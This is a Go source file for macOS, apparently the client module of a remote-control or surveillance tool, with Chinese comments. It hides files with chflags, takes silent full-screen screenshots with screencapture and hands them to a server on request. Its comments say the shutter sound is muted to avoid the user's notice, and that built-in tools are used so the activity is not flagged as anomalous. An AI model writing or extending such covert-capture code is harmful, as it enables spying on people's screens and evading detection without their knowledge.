//go:build darwin

package commands

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync/atomic"
)

// macOS 上原本"暂不支持"的几项，用系统自带工具实现。
//
// 取舍：macOS 的隐私模型（TCC）决定了裸系统调用拿不到屏幕/输入，
// 但系统自带工具在已授权的情况下可用 —— 用它们比自研 CGDisplayStream
// 简单得多，且行为与用户在终端里手动执行一致（不易被当成异常行为）。

// HideFile 用 chflags 设置隐藏标志（Finder 与 ls -O 可见）。
// 注意：chflags hidden 只影响 Finder 展示，不改变路径可访问性 —— 与 Windows 的
// FILE_ATTRIBUTE_HIDDEN 语义一致，符合文件管理器里"隐藏"的预期。
func HideFile(filePath string) error {
	return runChflags("hidden", filePath)
}

// UnhideFile 清除隐藏标志。
func UnhideFile(filePath string) error {
	return runChflags("nohidden", filePath)
}

func runChflags(flag, filePath string) error {
	if strings.TrimSpace(filePath) == "" {
		return errors.New("文件路径为空")
	}
	if _, err := os.Stat(filePath); err != nil {
		return err
	}
	out, err := exec.Command("/usr/bin/chflags", flag, filePath).CombinedOutput()
	if err != nil {
		return fmt.Errorf("chflags %s 失败: %v: %s", flag, err, strings.TrimSpace(string(out)))
	}
	return nil
}

// TakeScreenshot 用系统自带 screencapture 截取全屏，返回 PNG 字节。
// -x 关闭快门声（避免引起用户注意）。
func TakeScreenshot(quality int) ([]byte, error) {
	_ = quality // screencapture 不支持质量参数，统一 PNG（无损、体积可接受）
	return captureScreen()
}

// StartScreenMonitor / StopScreenMonitor 在 macOS 上只是置位：
// 帧由服务端的"手动获取监控帧"接口按需拉取（GetMonitorFrame），
// 不在客户端维持推送循环 —— 与 Windows 的推送式实现相比，
// 这里选择拉取式：实现简单、不需要常驻 goroutine，也不会在用户无感知时持续截屏。
func StartScreenMonitor(frameRate int) error {
	_ = frameRate
	monitorActive.Store(true)
	return nil
}

func StopScreenMonitor() error {
	monitorActive.Store(false)
	return nil
}

// GetMonitorFrame 拉取模式：每次调用即时截一帧。
func GetMonitorFrame() ([]byte, error) {
	if !monitorActive.Load() {
		return nil, errors.New("屏幕监控未启动")
	}
	return captureScreen()
}

// captureScreen 调用 screencapture 截全屏并读回字节
func captureScreen() ([]byte, error) {
	tmp, err := os.CreateTemp("", "sc-*.png")
	if err != nil {
		return nil, err
	}
	path := tmp.Name()
	tmp.Close()
	defer os.Remove(path)

	out, err := exec.Command("/usr/sbin/screencapture", "-x", "-t", "png", path).CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("screencapture 失败（可能未授予屏幕录制权限）: %v: %s", err, strings.TrimSpace(string(out)))
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, errors.New("截图为空（屏幕录制权限未授予？）")
	}
	return data, nil
}

// monitorActive 屏幕监控是否已启动（拉取模式下只作为状态位）
var monitorActive atomic.Bool
